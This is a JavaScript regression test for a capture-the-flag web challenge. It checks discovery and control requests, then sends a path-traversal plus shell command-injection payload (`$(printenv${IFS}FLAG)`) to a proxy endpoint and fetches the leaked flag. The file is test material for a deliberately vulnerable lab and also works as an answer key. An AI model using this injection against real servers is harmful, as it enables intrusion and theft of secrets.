import assert from 'node:assert/strict';
import http from 'node:http';

const target = new URL(process.env.CHALLENGE_URL ?? 'http://127.0.0.1:18083');

function rawRequest(path, method = 'GET') {
  return new Promise((resolve, reject) => {
    const request = http.request({
      hostname: target.hostname,
      port: target.port || 80,
      path,
      method,
      headers: { Connection: 'close' },
      timeout: 3_000,
    }, (response) => {
      const chunks = [];
      response.on('data', (chunk) => chunks.push(chunk));
      response.on('end', () => resolve({
        status: response.statusCode,
        headers: response.headers,
        body: Buffer.concat(chunks).toString('utf8'),
      }));
    });
    request.on('timeout', () => request.destroy(new Error('timeout')));
    request.on('error', reject);
    request.end();
  });
}

const health = await rawRequest('/healthz');
assert.equal(health.status, 200);
assert.equal(JSON.parse(health.body).backend, 'down');

const home = await rawRequest('/');
assert.equal(home.status, 200);
assert.match(home.body, /Proxy Panic/);
assert.doesNotMatch(home.body, /flag\{/i);

const js = await rawRequest('/assets/office.js');
assert.equal(js.status, 200);
assert.match(js.body, /proxy\.php/);

const map = await rawRequest('/assets/office.js.map');
assert.equal(map.status, 200);
assert.match(map.body, /raw_prefix_before/);
assert.match(map.body, /shell_exec/);
assert.doesNotMatch(map.body, /flag\{|printenv|diagnostics\/bootstrap/);

const normal = await rawRequest('/apps/builtin-code/proxy.php?status=1');
assert.equal(normal.status, 503);
assert.equal(JSON.parse(normal.body).backend, 'down');
assert.doesNotMatch(normal.body, /flag\{/i);
const normalTrace = await rawRequest(JSON.parse(normal.body).diagnostic);
assert.equal(normalTrace.status, 200);
assert.doesNotMatch(normalTrace.body, /flag\{/i);

const wrongMethod = await rawRequest('/apps/builtin-code/proxy.php?status=1', 'POST');
assert.equal(wrongMethod.status, 405);

const directTraversal = await rawRequest('/nothing/%2e%2e/apps/builtin-code/proxy.php?status=1');
assert.equal(directTraversal.status, 503);
assert.doesNotMatch(directTraversal.body, /flag\{/i);

const missing = await rawRequest(`/diagnostics/bootstrap/${'0'.repeat(12)}`);
assert.equal(missing.status, 404);

const exploitPath = `/x$(printenv\${IFS}FLAG)x/%2e%2e/apps/builtin-code/proxy.php?status=1`;
const trigger = await rawRequest(exploitPath);
assert.equal(trigger.status, 503);
assert.equal(JSON.parse(trigger.body).bootstrap, 'attempted');

const proof = await rawRequest(JSON.parse(trigger.body).diagnostic);
assert.equal(proof.status, 200);
assert.match(proof.body, /flag\{.+\}/);

const serializedPublic = JSON.stringify({
  health, home, js, map, normal, wrongMethod, directTraversal, missing,
});
assert.doesNotMatch(serializedPublic, /flag\{/i);

console.log('proxy-panic regression: discovery, controls, and intended cold-start command injection passed');

